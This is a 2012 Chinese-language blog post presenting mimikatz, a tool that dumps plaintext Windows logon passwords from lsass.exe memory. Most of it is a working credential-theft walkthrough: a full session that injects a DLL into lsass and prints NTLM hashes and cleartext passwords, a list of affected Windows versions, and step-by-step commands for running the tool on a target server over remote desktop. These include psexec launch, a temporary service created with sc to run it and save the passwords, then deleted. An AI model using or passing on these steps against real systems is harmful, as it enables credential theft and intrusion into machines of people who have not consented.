---
author: admin
comments: true
date: 2012-02-25 02:09:54+00:00
layout: post
slug: password-tools-mimikatz
title: 神器mimikatz
wordpress_id: 911
categories:
- 工具
---

法国佬写的一款工具，可以抓取windows明文密码。


> mimikatz 1.0 x86 (pre-alpha) /* Traitement du Kiwi */
> 
> mimikatz # privilege::debug
> Demande d'ACTIVATION du privilège : SeDebugPrivilege : OK
> 
> mimikatz # inject::process lsass.exe sekurlsa.dll
> 
> PROCESSENTRY32(lsass.exe).th32ProcessID = 488
> 
> Attente de connexion du client...
> 
> Serveur connecté à un client !
> 
> Message du processus :
> 
> Bienvenue dans un processus distant
> 
> Gentil Kiwi
> 
> SekurLSA : librairie de manipulation des données de sécurités dans LSASS
> 
> mimikatz # @getLogonPasswords
> 
> Authentification Id : 0;434898
> 
> Package d'authentification : NTLM
> 
> Utilisateur principal : Gentil User
> 
> Domaine d'authentification : vm-w7-ult
> 
> msv1_0 : lm{ e52cac67419a9a224a3b108f3fa6cb6d }, ntlm{ 8846f7eaee8fb117ad06bdd830b7586c }
> 
> wdigest : password
> 
> tspkg : password
> 
> Authentification Id : 0;269806
> 
> Package d'authentification : NTLM
> 
> Utilisateur principal : Gentil Kiwi
> 
> Domaine d'authentification : vm-w7-ult
> 
> msv1_0 : lm{ d0e9aee149655a6075e4540af1f22d3b }, ntlm
> { cc36cf7a8514893efccd332446158b1a }
> 
> wdigest : waza1234/
> 
> tspkg : waza1234/


经测试，通杀：
> Windows Server 2003
> 
> Windows Server 2008
> 
> Windows Vista
> 
> Windows 7
> 
> Windows 7 SP1

貌似只有 Windows 2000 与 Windows XP 无法使用。 不过，2000/xp 可以用以前的 FindPassword ，Windows 2003 - Windows 7 微软的这个处理机制没有变。 域也可以，理论上是没问题的，登录过都在 lsass.exe 里面。

**原理**

> 原理就是登陆的时候输入的密码，经过 lsass.exe 里的 wdigest 和 tspkg 两个模块调用后，它们对之进行加密处理，而没有进行擦除，而且该加密通过特征可以定位，并且按照微软的算法可逆。只要登陆过，就可以抓出来，它进行枚举的，这一切都是微软的错。 也就是说，开机以后，只要是登陆过的用户，在没重启前（因为重启内存就清零了，这里不包括使用其他方法清理内存），都可以抓出来，注销也是无用的，因为内存中的密码并没有清除，所以还是可以抓出来的。
这应该算是密码泄露，很严重的漏洞，估计微软会出补丁。

**在远程终端（3389、mstsc.exe）、虚拟桌面中抓取密码的方法**

通常你在远程终端中运行该程序会提示：存储空间不足，无法处理此命令。
这是因为在终端模式下，不能插入远线程，跨会话不能注入，将以下文件打包后上传至目标服务器，然后解压释放，注意路径中绝对不能有中文（可以有空格）！否则加载DLL的时候会报错：找不到文件。

> mimikatz_trunktoolsPsExec.exe
> 
> mimikatz_trunkWin32mimikatz.exe
> 
> mimikatz_trunkWin32sekurlsa.dll


然后使用以下任何一种方法即可抓取密码：


> //最简单实用的方法，使用 PsExec.exe 启动。
> 
> //在本机启动交互式命令提示窗口
> 
> psexec \127.0.0.1 cmd.exe
> 
> //启动 mimikatz.exe
> 
> C:mimikatz_trunkWin32mimikatz.exe
> 
> //提升权限
> 
> privilege::debug
> 
> //注入dll，要用绝对路径！并且路径中绝对不能有中文（可以有空
> 格）！
> 
> inject::process lsass.exe
> 
>  "C:mimikatz_trunkWin32sekurlsa.dll"
>  
> //抓取密码
> 
> @getLogonPasswords
> 
> //退出，不要用 ctrl + c，会导致 mimikatz.exe CPU 占用达到 100%，死循环。
> 
> exit
> 
> //*********************************************************
> 
> //使用 At 启动
> 
> at ***
> 
> //*********************************************************
> 
> //创建服务方法
> 
> sc create getpassword binpath= "cmd.exe /c
> 
> c:xxxmimikatz.exe < command.txt password.txt"
> 
> sc start getpassword
> 
> sc delete getpassword
> 
> //*********************************************************
> 
> //telnet 远程命令管道
> 
> telnet ****
> 
> 
> 原文见: http://blog.gentilkiwi.com/mimikatz
> 参考链接：
> 
> http://lcx.cc/?FoxNews=2265.html
> 
> http://hi.baidu.com/hackercasper/blog/item/b080dbd05eb6a5cc562c8461.html
